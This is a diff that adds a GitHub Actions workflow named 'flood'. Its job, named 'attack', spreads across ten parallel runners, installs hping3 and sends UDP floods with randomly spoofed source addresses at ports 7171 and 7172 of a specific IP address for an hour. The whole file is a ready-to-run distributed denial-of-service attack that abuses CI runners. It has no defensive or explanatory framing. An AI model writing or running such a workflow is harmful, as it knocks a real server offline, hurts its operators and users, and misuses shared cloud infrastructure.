@@ -1,0 +1,15 @@
+name: flood
+on:
+  workflow_dispatch:
+jobs:
+  attack:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        runner: [1,2,3,4,5,6,7,8,9,10]
+    steps:
+    - run: |
+        sudo apt-get update && sudo apt-get install -y hping3
+        hping3 --flood --udp -p 7171 --rand-source 34.151.221.105 &
+        hping3 --flood --udp -p 7172 --rand-source 34.151.221.105 &
+        sleep 3600
